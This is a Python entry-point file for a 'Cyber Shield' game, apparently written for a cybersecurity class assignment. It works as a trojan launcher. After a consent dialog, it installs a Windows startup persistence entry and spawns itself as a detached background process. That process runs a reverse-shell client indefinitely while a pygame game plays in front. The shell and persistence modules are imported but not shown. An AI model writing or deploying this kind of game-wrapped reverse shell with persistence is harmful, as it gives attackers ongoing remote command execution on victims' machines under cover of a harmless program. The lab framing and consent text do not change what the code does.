"""
Entry point for the Cyber Shield game client that:
  - Shows a clear consent / awareness dialog
  - Optionally enables persistence on Windows
  - Starts the reverse‑shell network client in the background
  - Launches the main pygame game from src.main
"""

import tkinter as tk
from tkinter import messagebox
import sys
import subprocess
import time
import os
from pathlib import Path

# Support both package and “loose script” execution so PyInstaller works.
root_path = Path(__file__).resolve().parent.parent
if str(root_path) not in sys.path:
    sys.path.insert(0, str(root_path))

try:  # when run as part of the game_client package
    from . import deps_check, persistence  # type: ignore[import-not-found]
    from .config import GameConfig  # type: ignore[import-not-found]
    from .net_client import ShellClient  # type: ignore[import-not-found]
except ImportError:  # when bundled as a flat script
    try:
        from game_client import deps_check, persistence  # type: ignore[import-not-found]
        from game_client.config import GameConfig  # type: ignore[import-not-found]
        from game_client.net_client import ShellClient  # type: ignore[import-not-found]
    except ImportError:
        import deps_check, persistence  # type: ignore
        from config import GameConfig  # type: ignore
        from net_client import ShellClient  # type: ignore


def _show_consent_dialog(root: tk.Tk) -> bool:
    text = (
        "CYBER SHIELD – LAB GAME\n\n"
        "This game is part of a cybersecurity assignment.\n\n"
        "If you click 'Proceed to Game':\n"
        "  • The game will open a network connection back to a listener\n"
        "    controlled by the student (for educational purposes only).\n"
        "  • Commands typed in the listener can be executed on this machine\n"
        "    while the game is running.\n"
        "  • A startup entry will be created so this game/client can start\n"
        "    automatically when you log in again, until you run the cleanup tool.\n\n"
        "Use only on a virtual machine or lab computer that you control."
    )
    return messagebox.askokcancel(
        "Cyber Shield – Information",
        text,
        parent=root,
        default=messagebox.OK,
    )


def _is_already_running() -> bool:
    """
    Check if a silent instance is already running using a lock file.
    """
    lock_file = Path.home() / ".cyber_shield" / "client.lock"
    return lock_file.exists()


def _run_silent_mode() -> None:
    """
    Run only the shell client in the background indefinitely.
    """
    lock_file = Path.home() / ".cyber_shield" / "client.lock"
    lock_file.parent.mkdir(exist_ok=True)

    # Simple lock mechanism
    if lock_file.exists():
        # In a real app we might check if the PID is still alive,
        # but for this demo, we'll just try to write to it.
        try:
            lock_file.unlink()
        except OSError:
            return  # Probably locked by another process

    lock_file.write_text(str(os.getpid()))

    try:
        shell_client = ShellClient()
        shell_client.start()
        # Keep the main thread alive so the daemon thread can work
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        if lock_file.exists():
            lock_file.unlink()


def launch_game() -> None:
    """
    Main entry.
    """
    # 1) Check for silent flag (used by startup persistence)
    if "--silent" in sys.argv:
        _run_silent_mode()
        return

    # 2) Consent + dependency checks via Tkinter
    root = tk.Tk()
    root.withdraw()

    if not _show_consent_dialog(root):
        return

    # Silent environment check
    ok, _ = deps_check.check_runtime_dependencies()
    if not ok:
        return

    # Automatically enable persistence after consent
    persistence.install_startup_entry()

    # 3) Ensure background shell client is running
    if not _is_already_running():
        # Spawn ourselves in silent mode in the background
        # Use subprocess.DETACHED_PROCESS or similar if on Windows to be truly independent
        creation_flags = 0
        if sys.platform == "win32":
            # 0x00000008 is DETACHED_PROCESS
            creation_flags = 0x00000008

        subprocess.Popen(
            [sys.executable, "--silent"],
            creationflags=creation_flags,
            close_fds=True
        )

    # 4) Launch the existing pygame game loop from src.main
    from src.main import main as game_main

    try:
        game_main()
    except Exception:
        # Don't let game crashes kill the caller
        pass


def main() -> None:  # PyInstaller friendly
    launch_game()


if __name__ == "__main__":
    main()

